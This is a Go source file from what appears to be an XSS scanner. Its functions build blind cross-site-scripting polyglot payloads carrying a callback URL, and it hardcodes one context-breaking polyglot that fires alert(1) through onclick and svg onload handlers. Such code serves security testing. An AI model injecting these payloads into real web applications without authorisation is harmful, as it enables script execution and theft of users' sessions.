package payloads

import (
	"strings"
)

// GetPolyglots returns a list of advanced polyglot payloads injected with the callback URL
// GetPolyglots returns a list of advanced polyglot payloads injected with the callback URL
func GetPolyglots(callbackURL string) []string {
	payloads := []string{}
	for _, v := range Vectors {
		if hasTag(v.Tags, "blind") && hasTag(v.Tags, "polyglot") {
			// Replace placeholders
			// Note: Some polyglots might use callback multiple times or in specific ways
			// The vector content should use {{CALLBACK}}
			payload := strings.ReplaceAll(v.Content, "{{CALLBACK}}", callbackURL)
			payloads = append(payloads, payload)
		}
	}
	return payloads
}

// GetDefaultPolyglot returns a generic polyglot payload for alert(1)
func GetDefaultPolyglot() string {
	for _, v := range Vectors {
		if hasTag(v.Tags, "reflected") && hasTag(v.Tags, "polyglot") && hasTag(v.Tags, "default") {
			return v.Content
		}
	}
	// Fallback if vector not found (should not happen)
	return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"
}
